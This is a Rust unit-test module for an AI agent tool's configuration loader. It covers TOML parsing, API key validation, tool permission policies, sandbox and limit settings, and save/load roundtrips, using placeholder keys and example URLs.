agent_paths = []

[providers]

[[mcp_servers]]
name = "remote"
url = "https://mcp.example.com/mcp"
"#,
        )
        .unwrap();

        let config = Config::load_from_path(&path).expect("valid http entry should load");
        assert_eq!(
            config.mcp_servers[0].url.as_deref(),
            Some("https://mcp.example.com/mcp")
        );
    }

    #[test]
    fn config_from_toml_with_model_capabilities() {
        // A one-field entry, which is what someone correcting a wrong context
        // window actually writes. It used to fail to deserialize and be dropped
        // in silence (#338); now it parses and names only that field, so
        // everything it did not mention comes from the provider.
        let toml = r#"
[model_capabilities."my-custom-model"]
max_context_tokens = 1048576
"#;
        let config: Config = toml::from_str(toml).expect("a partial entry parses");
        let entry = config
            .model_capabilities
            .get("my-custom-model")
            .expect("the entry survives");
        assert_eq!(entry.max_context_tokens, Some(1_048_576));
        assert_eq!(
            entry.max_output_tokens, None,
            "an unmentioned field stays unset rather than defaulting"
        );
        assert_eq!(entry.supports_tools, None);
    }

    /// A misspelled key is refused rather than ignored, so a typo cannot look
    /// like a working override.
    #[test]
    fn config_model_capabilities_rejects_an_unknown_key() {
        let toml = r#"
[model_capabilities."my-custom-model"]
max_contxt_tokens = 1048576
"#;
        assert!(toml::from_str::<Config>(toml).is_err());
    }

    #[test]
    fn validate_keys_is_quiet_about_blank_keys() {
        let mut config = Config::default();
        config.providers.anthropic_api_key = Some(String::new());
        config.providers.openai_api_key = Some("   ".to_string());
        assert!(config.validate_keys().is_empty());
        // A genuinely wrong-looking key still warns.
        config.providers.anthropic_api_key = Some("nope".to_string());
        assert_eq!(config.validate_keys().len(), 1);
    }

    #[test]
    fn validate_keys_both_bad() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: Some("bad".to_string()),
                openai_api_key: Some("bad".to_string()),
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        let warnings = config.validate_keys();
        assert_eq!(warnings.len(), 2);
    }

    // ─── config_path ───────────────────────────────────────────────────────

    #[test]
    fn config_path_contains_leviath() {
        // Force `LEVIATH_CONFIG_PATH` unset (via `temp_env::with_var_unset`,
        // which also serializes against every other temp-env test) so
        // `config_path()` resolves to the real default, not a concurrently-set
        // override.
        temp_env::with_var_unset("LEVIATH_CONFIG_PATH", || {
            let path = Config::config_path();
            assert!(path.to_str().unwrap().contains(".leviath"));
            assert!(path.to_str().unwrap().ends_with("config.toml"));
        });
    }

    // ─── Config save/load roundtrip ────────────────────────────────────────

    #[test]
    fn config_toml_roundtrip() {
        let config = Config {
            default_provider: "openai".to_string(),
            providers: ProviderConfig {
                anthropic_api_key: Some("sk-ant-key".to_string()),
                openai_api_key: None,
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            tool_permissions: {
                let mut m = HashMap::new();
                m.insert("bash".to_string(), ToolPolicy::Deny);
                m
            },
            ..Config::default()
        };

        let serialized = toml::to_string_pretty(&config).unwrap();
        let deserialized: Config = toml::from_str(&serialized).unwrap();
        assert_eq!(deserialized.default_provider, "openai");
        assert_eq!(
            deserialized.providers.anthropic_api_key.as_deref(),
            Some("sk-ant-key")
        );
        assert_eq!(
            deserialized.tool_permissions.get("bash"),
            Some(&ToolPolicy::Deny)
        );
    }

    // ─── validate_keys: both keys valid ──────────────────────────────────

    #[test]
    fn validate_keys_both_valid() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: Some("sk-ant-good-key".to_string()),
                openai_api_key: Some("sk-good-key".to_string()),
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        assert!(config.validate_keys().is_empty());
    }

    // ─── validate_keys: google key has no validation ─────────────────────

    #[test]
    fn validate_keys_google_key_not_validated() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: None,
                openai_api_key: None,
                google_api_key: Some("anything-goes".to_string()),
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        // Google key has no prefix validation
        assert!(config.validate_keys().is_empty());
    }

    // ─── Config TOML parsing: registries ─────────────────────────────────

    #[test]
    fn config_from_toml_custom_registries() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = ["/my/agents"]

[providers]
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.agent_paths.len(), 1);
    }

    // ─── Config save writes file ─────────────────────────────────────────

    #[test]
    fn config_save_creates_file() {
        let dir = tempfile::tempdir().unwrap();
        let config_path = dir.path().join("subdir").join("config.toml");
        // We can't easily test Config::save() because it uses a fixed path,
        // but we can test the serialization and write manually
        let config = Config::default();
        let content = toml::to_string_pretty(&config).unwrap();
        std::fs::create_dir_all(config_path.parent().unwrap()).unwrap();
        std::fs::write(&config_path, &content).unwrap();
        assert!(config_path.exists());
        let loaded_content = std::fs::read_to_string(&config_path).unwrap();
        let loaded: Config = toml::from_str(&loaded_content).unwrap();
        assert_eq!(loaded.default_provider, "anthropic");
    }

    // ─── TitleConfig serde from TOML ─────────────────────────────────────

    #[test]
    fn title_config_from_toml_defaults() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert!(config.title.enabled);
        assert!(config.title.provider.is_none());
        assert!(config.title.model.is_none());
    }

    #[test]
    fn title_config_from_toml_disabled() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]

[title]
enabled = false
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert!(!config.title.enabled);
    }

    #[test]
    fn title_config_missing_enabled_key_uses_default_true() {
        // Unlike `title_config_from_toml_defaults` (which omits the whole
        // `[title]` table, falling back to `Config`'s own `#[serde(default)]`
        // for the field - never invoking `TitleConfig`'s own per-field
        // parsing at all), this includes `[title]` but omits `enabled`
        // specifically, forcing serde to deserialize `TitleConfig` field by
        // field and fall back to `default_true()` for the missing key.
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]

[title]
provider = "openai"
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert!(config.title.enabled);
        assert_eq!(config.title.provider.as_deref(), Some("openai"));
    }

    // ─── ToolPolicy in tool_permissions ───────────────────────────────────

    #[test]
    fn config_tool_permissions_allow() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]

[tool_permissions]
read_file = "allow"
write_file = "ask"
bash = "deny"
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(
            config.tool_permissions.get("read_file"),
            Some(&ToolPolicy::Allow)
        );
        assert_eq!(
            config.tool_permissions.get("write_file"),
            Some(&ToolPolicy::Ask)
        );
        assert_eq!(config.tool_permissions.get("bash"), Some(&ToolPolicy::Deny));
    }

    // ─── Config with agent_paths ─────────────────────────────────────────

    #[test]
    fn config_with_agent_paths() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = ["/home/user/agents", "/opt/agents"]

[providers]
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.agent_paths.len(), 2);
    }

    // ─── Config load() ────────────────────────────────────────────────────

    #[test]
    fn config_load_from_nonexistent_path_returns_default() {
        // Config::load() uses a fixed path; we can test indirectly by
        // verifying defaults are applied when no file exists.
        // We can't easily override the path, but we can verify default behavior.
        let config = Config::default();
        assert_eq!(config.default_provider, "anthropic");
        assert!(config.providers.anthropic_api_key.is_none());
    }

    #[test]
    fn config_load_from_toml_string() {
        // Test the TOML parsing path of load() by parsing directly.
        let toml_content = r#"
default_provider = "openai"
agent_paths = []

[providers]
anthropic_api_key = "sk-ant-test-key"
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.default_provider, "openai");
        assert_eq!(
            config.providers.anthropic_api_key.as_deref(),
            Some("sk-ant-test-key")
        );
        // No [nudge] section ⇒ every field unset ⇒ built-in defaults apply.
        assert_eq!(config.nudge, leviath_core::NudgeConfig::default());
    }

    #[test]
    fn config_parses_partial_nudge_section() {
        // A [nudge] section only pins the keys it names.
        let config: Config = toml::from_str(
            r#"
default_provider = "openai"
agent_paths = []

[providers]

[nudge]
enabled = false
"#,
        )
        .unwrap();
        assert_eq!(config.nudge.enabled, Some(false));
        assert_eq!(config.nudge.max, None);
        assert_eq!(config.nudge.text, None);
    }

    #[test]
    fn config_save_and_load_with_file() {
        // Test Config::save() by writing to a temp location manually.
        let dir = tempfile::tempdir().unwrap();
        let config_path = dir.path().join("config.toml");

        let config = Config {
            default_provider: "openai".to_string(),
            providers: ProviderConfig {
                anthropic_api_key: Some("sk-ant-test".to_string()),
                openai_api_key: Some("sk-test".to_string()),
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            openrouter_api_key: Some("sk-or-test".to_string()),
            default_model: Some("gpt-5".to_string()),
            ..Config::default()
        };

        let content = toml::to_string_pretty(&config).unwrap();
        std::fs::write(&config_path, &content).unwrap();

        let loaded_content = std::fs::read_to_string(&config_path).unwrap();
        let loaded: Config = toml::from_str(&loaded_content).unwrap();

        assert_eq!(loaded.default_provider, "openai");
        assert_eq!(
            loaded.providers.anthropic_api_key.as_deref(),
            Some("sk-ant-test")
        );
        assert_eq!(loaded.default_model.as_deref(), Some("gpt-5"));
    }

    #[test]
    fn config_create_config_dir_creates_parent() {
        let dir = tempfile::tempdir().unwrap();
        let new_dir = dir.path().join("nested").join("config");
        // create_config_dir is private, but we test indirectly via filesystem
        std::fs::create_dir_all(&new_dir).unwrap();
        assert!(new_dir.exists());
    }

    #[test]
    fn config_default_title_enabled() {
        let config = Config::default();
        assert!(config.title.enabled);
    }

    #[test]
    fn config_serialize_with_all_options() {
        let mut model_caps = HashMap::new();
        model_caps.insert(
            "my-model".to_string(),
            ModelCapabilityOverride {
                supports_temperature: Some(true),
                supports_streaming: Some(true),
                supports_tools: Some(true),
                supports_system_prompt: Some(true),
                max_context_tokens: Some(8192),
                max_output_tokens: Some(4096),
            },
        );
        let mut tool_perms = HashMap::new();
        tool_perms.insert("bash".to_string(), ToolPolicy::Allow);

        let config = Config {
            default_provider: "anthropic".to_string(),
            providers: ProviderConfig {
                anthropic_api_key: Some("sk-ant-key".to_string()),
                openai_api_key: None,
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            agent_paths: vec![std::path::PathBuf::from("/my/agents")],
            openrouter_api_key: None,
            ollama_base_url: Some("http://custom:11434".to_string()),
            mcp_servers: vec![],
            default_model: None,
            model_capabilities: model_caps,
            model_providers: HashMap::new(),
            tool_permissions: tool_perms,
            agent_tool_permissions: HashMap::new(),
            safe_commands: crate::approvals::SafeCommands::default(),
            agent_safe_commands: HashMap::new(),
            title: TitleConfig {
                enabled: false,
                provider: Some("openai".to_string()),
                model: Some("gpt-5-mini".to_string()),
            },
            request_timeout_secs: None,
            rate_limits: HashMap::new(),
            taint_tracking: false,
            limits: LimitsConfig {
                mcp_idle_disconnect_secs: default_mcp_idle_disconnect_secs(),
                max_tool_call_write_bytes: None,
                max_run_write_bytes: None,
                max_concurrent_inferences: Some(4),
                max_concurrent_tools: 3,
                default_max_iterations: Some(99),
                exact_token_counting: false,
                script_shell_timeout_secs: 45,
                stall_timeout_secs: 90,
                dead_cycles_before_relief: 6,
                finished_retention_secs: 120,
                wedge_timeout_secs: 420,
                provider_failures_before_open: 5,
                provider_circuit_cooldown_secs: 120,
                interaction_timeout_secs: 120,
                inference_retry_attempts: 6,
                inference_retry_base_ms: 250,
            },
            batch_tool_hint: true,
            shell_hint: false,
            nudge: leviath_core::NudgeConfig {
                enabled: Some(true),
                max: Some(2),
                text: Some("Use your tools.".to_string()),
            },
            webhook: WebhookConfig {
                max_retries: 5,
                base_delay_ms: 250,
                max_delay_ms: 10_000,
                timeout_secs: 7,
            },
            observability: ObservabilityConfig {
                enabled: true,
                exporter: TelemetryExporterKind::Stdout,
                endpoint: Some("http://collector:4318".to_string()),
                service_name: Some("leviath-prod".to_string()),
            },
            sandbox: Some(leviath_core::ToolSandboxConfig {
                kind: leviath_core::SandboxKind::Container,
                image: Some("ubuntu:24.04".to_string()),
                network: false,
                ..Default::default()
            }),
            tool_script_permissions: ScriptToolPermissions {
                http_get: ScriptPermission::Allow,
                http_post: ScriptPermission::Deny,
                shell: ScriptPermission::Deny,
                read_file: ScriptPermission::Inherit,
                write_file: ScriptPermission::Deny,
                env_var: ScriptPermission::Allow,
            },
            security: SecurityConfig {
                allowed_workdirs: Vec::new(),
                allow_seed_commands: false,
                allow_local_network: true,
                allow_env_vars: vec!["MY_PROVIDER_KEY".to_string()],
                allow_blueprint_read_paths: true,
                allow_blueprint_safe_commands: true,
                read_paths: vec!["~/.leviath/runs".to_string()],
                credential_store: leviath_core::CredentialStoreKind::Keychain,
                allow_blueprint_permissions: false,
                shell_env: leviath_core::ShellEnvMode::default(),
                shell_env_withhold: Vec::new(),
            },
            agent_read_paths: HashMap::from([(
                "cto".to_string(),
                ReadPathGrants {
                    allow: vec!["glob:~/design-docs/**".to_string()],
                },
            )]),
        };

        let serialized = toml::to_string_pretty(&config).unwrap();
        let deserialized: Config = toml::from_str(&serialized).unwrap();

        assert_eq!(deserialized.default_provider, "anthropic");
        assert_eq!(deserialized.limits.max_concurrent_inferences, Some(4));
        assert_eq!(deserialized.limits.max_concurrent_tools, 3);
        assert_eq!(deserialized.limits.script_shell_timeout_secs, 45);
        assert_eq!(deserialized.limits.dead_cycles_before_relief, 6);
        assert_eq!(deserialized.limits.finished_retention_secs, 120);
        assert_eq!(
            deserialized.tool_script_permissions.http_get,
            ScriptPermission::Allow
        );
        assert_eq!(
            deserialized.tool_script_permissions.shell,
            ScriptPermission::Deny
        );
        assert_eq!(
            deserialized.tool_script_permissions.write_file,
            ScriptPermission::Deny
        );
        // `shell_hint` defaults to true, so a `false` surviving the round trip
        // is what proves the field is actually written and read back.
        assert!(deserialized.batch_tool_hint);
        assert!(!deserialized.shell_hint);
        assert!(!deserialized.security.allow_seed_commands);
        assert!(deserialized.security.allow_blueprint_read_paths);
        assert_eq!(deserialized.security.read_paths, vec!["~/.leviath/runs"]);
        assert_eq!(
            deserialized.agent_read_paths.get("cto"),
            Some(&ReadPathGrants {
                allow: vec!["glob:~/design-docs/**".to_string()],
            })
        );
        assert_eq!(
            deserialized.nudge,
            leviath_core::NudgeConfig {
                enabled: Some(true),
                max: Some(2),
                text: Some("Use your tools.".to_string()),
            }
        );
        assert_eq!(deserialized.webhook.max_retries, 5);
        assert_eq!(deserialized.webhook.base_delay_ms, 250);
        assert_eq!(deserialized.webhook.max_delay_ms, 10_000);
        assert_eq!(deserialized.webhook.timeout_secs, 7);
        assert!(deserialized.observability.enabled);
        assert_eq!(
            deserialized.observability.exporter,
            TelemetryExporterKind::Stdout
        );
        assert_eq!(
            deserialized.observability.endpoint.as_deref(),
            Some("http://collector:4318")
        );
        assert_eq!(
            deserialized.observability.service_name.as_deref(),
            Some("leviath-prod")
        );
        assert_eq!(deserialized.limits.default_max_iterations, Some(99));
        assert_eq!(deserialized.limits.inference_retry_attempts, 6);
        assert_eq!(deserialized.limits.inference_retry_base_ms, 250);
        assert_eq!(
            deserialized.providers.anthropic_api_key.as_deref(),
            Some("sk-ant-key")
        );
        assert_eq!(deserialized.agent_paths.len(), 1);
        assert!(deserialized.model_capabilities.contains_key("my-model"));
        assert_eq!(
            deserialized.tool_permissions.get("bash"),
            Some(&ToolPolicy::Allow)
        );
        assert!(!deserialized.title.enabled);
        assert_eq!(deserialized.title.provider.as_deref(), Some("openai"));
        let sandbox = deserialized.sandbox.expect("sandbox round-trips");
        assert_eq!(sandbox.kind, leviath_core::SandboxKind::Container);
        assert_eq!(sandbox.image.as_deref(), Some("ubuntu:24.04"));
        assert!(!sandbox.network);
    }

    // ─── Config with multiple model_capabilities ─────────────────────────

    #[test]
    fn config_multiple_model_capabilities() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]

[model_capabilities."model-a"]
supports_temperature = true
supports_streaming = true
supports_tools = true
supports_system_prompt = true
max_context_tokens = 8192
max_output_tokens = 4096

[model_capabilities."model-b"]
supports_temperature = false
supports_streaming = false
supports_tools = false
supports_system_prompt = false
max_context_tokens = 2048
max_output_tokens = 1024
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.model_capabilities.len(), 2);
        let caps_a = config.model_capabilities.get("model-a").unwrap();
        assert_eq!(caps_a.supports_temperature, Some(true));
        assert_eq!(caps_a.max_context_tokens, Some(8192));
        let caps_b = config.model_capabilities.get("model-b").unwrap();
        assert_eq!(caps_b.supports_temperature, Some(false));
        assert_eq!(caps_b.max_context_tokens, Some(2048));
    }
}
